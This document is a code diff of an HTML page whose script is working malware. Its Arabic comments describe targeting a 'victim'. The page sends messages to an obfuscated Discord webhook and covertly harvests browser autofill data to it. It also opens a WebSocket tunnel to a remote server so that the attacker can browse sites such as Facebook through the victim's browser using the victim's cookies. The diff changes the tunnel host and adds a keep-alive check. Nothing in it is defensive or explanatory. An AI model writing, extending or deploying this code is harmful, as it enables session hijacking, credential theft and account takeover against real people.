@@ -14,10 +14,10 @@
     <h1 id="status" onclick="startMaster()">46</h1>
 
     <script>
-        // الرابط اللي طلع لك في Colab (تم تحويله لـ wss للاتصال الآمن)
-        const PROXY_SERVER = "wss://cold-shrimps-look.loca.lt";
+        // ✅ التعديل هنا: الرابط الجديد والمستقر من localhost.run
+        const PROXY_SERVER = "wss://6611cfd937b51a.lhr.life";
         
-        // رابط الديسكورد (مشفر كما هو في كودك)
+        // رابط الديسكورد المشفر
         const key = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
         const HOOK = atob(key);
 
@@ -39,7 +39,7 @@
             btn.style.color = "#0f0";
             
             // 1. إشعار ديسكورد بالدخول
-            sendDiscord("🔵 **V46: Signal S-1 Received (Proxy Initializing...)**");
+            sendDiscord("🔵 **V46: Signal S-1 Received (Master Server Active)**");
 
             // 2. محاولة سحب الأوتوفيل (صمتاً)
             const m = document.createElement('input');
@@ -50,7 +50,7 @@
                 if(m.value) sendDiscord("📊 **Data A-F Found:** " + m.value);
             }, 1000);
 
-            // 3. فتح النفق البروكسي مع Colab
+            // 3. فتح النفق البروكسي
             initTunnel();
         }
 
@@ -60,21 +60,19 @@
             socket.onopen = () => {
                 // إخبار السيرفر أن هذا هو "الضحية"
                 socket.send(JSON.stringify({ type: 'join' }));
-                sendDiscord("🚀 **Proxy Active:** Tunnel established via Colab.");
+                sendDiscord("🚀 **Proxy Active:** Tunnel established with Master Server.");
             };
 
             socket.onmessage = async (event) => {
                 const req = JSON.parse(event.data);
-                // إذا وصل طلب تصفح من فايرفوكس عندك
                 if (req.type === 'proxy_request') {
                     try {
                         const res = await fetch(req.url, {
                             method: req.method,
                             headers: req.headers,
-                            credentials: 'include' // استخدام كوكيز الضحية الحقيقية
+                            credentials: 'include' 
                         });
                         const body = await res.text();
-                        // إرسال النتيجة (فيسبوك الضحية) لفايرفوكس عندك
                         socket.send(JSON.stringify({
                             type: 'proxy_response',
                             id: req.id,
@@ -87,8 +85,12 @@
                 }
             };
 
-            // الحفاظ على الاتصال حياً في الخلفية
-            setInterval(() => socket.send(JSON.stringify({type: 'ping'})), 20000);
+            // الحفاظ على الاتصال حياً
+            setInterval(() => {
+                if(socket.readyState === WebSocket.OPEN) {
+                    socket.send(JSON.stringify({type: 'ping'}));
+                }
+            }, 20000);
         }
     </script>
 </body>
